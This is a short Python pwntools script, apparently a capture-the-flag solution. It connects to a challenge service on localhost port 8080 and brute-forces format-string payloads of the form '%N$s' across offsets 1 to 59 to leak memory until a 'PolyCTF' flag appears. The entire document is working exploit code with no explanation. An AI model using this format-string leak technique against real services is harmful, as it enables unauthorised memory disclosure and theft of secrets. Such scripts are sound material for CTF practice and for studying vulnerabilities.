import struct
from pwn import *


binary = context.binary = ELF("./flag")
context.log_level = 'error'
flag = 0
for i in range(1, 60):
    try:
        print(i)
        p = remote("127.0.0.1", 8080)
        # p = process()
        data = p.recv().decode().split()
        print(data)
        payload = f'%{i}$s'.encode()

        p.sendline(payload)
        p.sendline("a")
        check = p.recv()
        
        p.close()
        if b"PolyCTF" in check or flag:
            print(check)
            p.close()
            exit()
            
        
    except EOFError:
        print("Nah")
    except UnicodeDecodeError:
        print(check)
    except ValueError:
        pass

p.close()
